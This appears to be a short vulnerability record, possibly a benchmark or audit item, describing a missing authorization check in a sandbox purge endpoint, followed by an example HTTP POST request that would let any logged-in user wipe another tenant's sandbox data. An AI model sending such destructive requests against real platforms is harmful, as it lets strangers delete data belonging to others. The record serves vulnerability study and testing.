diagnosis: The view exposes a management command runner that purges all sandbox data for tenant_id. It performs no check to ensure request.user has administrative rights over tenant_id, allowing any authenticated user to wipe sandbox databases of competing tenants.
exploit_request:
POST /admin-api/sandboxes/purge/ HTTP/1.1
Host: platform.example.com
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

tenant_id=tenant_abc_778
